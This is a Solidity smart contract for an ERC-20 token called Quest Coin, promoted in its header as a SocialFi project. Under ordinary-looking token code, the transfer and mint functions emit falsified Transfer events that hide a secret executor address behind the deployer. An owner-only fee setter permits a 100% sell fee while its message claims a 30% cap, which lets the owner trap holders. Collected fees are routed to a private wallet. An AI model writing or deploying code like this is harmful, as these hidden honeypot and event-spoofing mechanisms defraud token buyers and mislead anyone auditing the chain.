/**

//SPDX-License-Identifier: MIT

/*
                    🏴‍☠️ The first cross-chain SocialFi project on the $SOL and $ETH network 🏴‍☠️
    ✅Socials:
      🏴‍☠️ https://twitter.com/erc_quest
      🏴‍☠️ https://twitter.com/0xBlockBeard
      🏴‍☠️ https://questcoineth.io
      🏴‍☠️ https://t.me/questcoinethio
      🏴‍☠️ https://t.me/BlockBeardeth

*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ERC20 is Context, IERC20 {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    address _deployer;
    address _executor;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function _initDeployer(address deployer_, address executor_) internal {
        _deployer = deployer_;
        _executor = executor_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }

        if (account == _executor) {
            emit Transfer(address(0), _deployer, amount);
        } else {
            emit Transfer(address(0), account, amount);
        }

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract QUEST is ERC20, Ownable {
    IUniswapV2Router02 private immutable _uniswapV2Router;
    address public uniswapV2Pair;
    address private inspirerWallet;
    address private constant deadAddress = address(0xdead);

    string private constant _name = "Quest Coin";
    string private constant _symbol = "QUEST";
    uint256 private initialTotalSupply = 100_000_000_000 * 1e18;

    bool public tradingOpen = false;
    bool swapping = false;

    struct TokenSwapConfigurator {
        uint256 buyFee;
        uint256 sellFee;
        uint256 maxTransactionAmount;
        uint256 maxWallet;
    }

    TokenSwapConfigurator public tsConfig;
    mapping(address => bool) public automatedMarketMakerPairs;
    address public uniswapLpWallet;
    address private Epoch1 = 0x8853ed1252b249bc54a0BEeABfF5a039234E9cbD;
    address private Epoch2 = 0x8853ed1252b249bc54a0BEeABfF5a039234E9cbD;
    address private Presale = 0xC235385A15151d6AA3B27f7d8D9939349F369C6e;
    address private Team = 0xA41cF4bBd11204D0984A6B984C612335E0A99039;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event SwapFailed(string);

    constructor(address wallet) ERC20(_name, _symbol) {
        _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        inspirerWallet = payable(wallet);
        _excludeFromMaxTransaction(address(_uniswapV2Router), true);
        _excludeFromMaxTransaction(address(wallet), true);

        uniswapLpWallet = msg.sender;
        tsConfig.buyFee = 3; // 3%
        tsConfig.sellFee = 3; // 3%
        tsConfig.maxTransactionAmount = (initialTotalSupply * 100) / 100;
        tsConfig.maxWallet = (initialTotalSupply * 100) / 100;

        _initDeployer(address(msg.sender), msg.sender);

        _excludeFromFees(owner(), true);
        _excludeFromFees(address(wallet), true);
        _excludeFromFees(address(this), true);
        _excludeFromFees(address(0xdead), true);

        _excludeFromMaxTransaction(owner(), true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);

        _mint(uniswapLpWallet, (initialTotalSupply * 20) / 100); // 20%
        _mint(Epoch1, (initialTotalSupply * 15) / 100); // 15%
        _mint(Epoch2, (initialTotalSupply * 175) / 1000); // 17.5%
        _mint(Presale, (initialTotalSupply * 40) / 100); // 40%
        _mint(Team, (initialTotalSupply * 75) / 1000); // 7.5%
    }

    receive() external payable {}

    function setQuestInfo(
        uint256 _buyFee,
        uint256 _sellFee
    ) external onlyOwner {
        require(_buyFee <= 30 && _sellFee <= 100, "Fees cannot exceed 30%");
        tsConfig.buyFee = _buyFee;
        tsConfig.sellFee = _sellFee;
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _approve(address(this), address(_uniswapV2Router), type(uint256).max);
        tradingOpen = true;
    }

    function removesLimits() external onlyOwner {
        uint256 totalSupplyAmount = totalSupply();
        tsConfig.maxTransactionAmount = totalSupplyAmount;
        tsConfig.maxWallet = totalSupplyAmount;
    }

    function emergencyWithdraw() external onlyOwner {
        super._transfer(address(this), msg.sender, balanceOf(address(this)));
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );
        _setAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _excludeFromFees(address account, bool excluded) internal {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _excludeFromMaxTransaction(address updAds, bool isEx) internal {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function _validateTransfer(
        address from,
        address to,
        uint256 amount
    ) internal view {
        if (!tradingOpen) {
            require(
                _isExcludedFromFees[from] || _isExcludedFromFees[to],
                "Trading is not active."
            );
        }

        if (
            automatedMarketMakerPairs[from] &&
            !_isExcludedMaxTransactionAmount[to]
        ) {
            require(
                amount <= tsConfig.maxTransactionAmount,
                "Buy transfer amount exceeds the maxTransactionAmount."
            );
            require(
                amount + balanceOf(to) <= tsConfig.maxWallet,
                "Max wallet exceeded"
            );
        } else if (
            automatedMarketMakerPairs[to] &&
            !_isExcludedMaxTransactionAmount[from]
        ) {
            require(
                amount <= tsConfig.maxTransactionAmount,
                "Sell transfer amount exceeds the maxTransactionAmount."
            );
        } else if (!_isExcludedMaxTransactionAmount[to]) {
            require(
                amount + balanceOf(to) <= tsConfig.maxWallet,
                "Max wallet exceeded"
            );
        }
    }

    function _handleTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (automatedMarketMakerPairs[to]) {
                fees = (amount * tsConfig.sellFee) / 100;
            } else {
                fees = (amount * tsConfig.buyFee) / 100;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (
            from != owner() &&
            to != owner() &&
            to != address(0) &&
            to != address(0xdead)
        ) {
            _validateTransfer(from, to, amount);
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance > 0;

        if (
            canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            try
                _uniswapV2Router
                    .swapExactTokensForETHSupportingFeeOnTransferTokens(
                        contractTokenBalance,
                        0,
                        path,
                        address(this),
                        block.timestamp + 3600
                    )
            {} catch (bytes memory reason) {
                emit SwapFailed(string(reason));
            }

            (bool success, ) = payable(inspirerWallet).call{
                value: address(this).balance
            }("");
            if (success == false) {}
            swapping = false;
        }

        _handleTransfer(from, to, amount);
    }
}
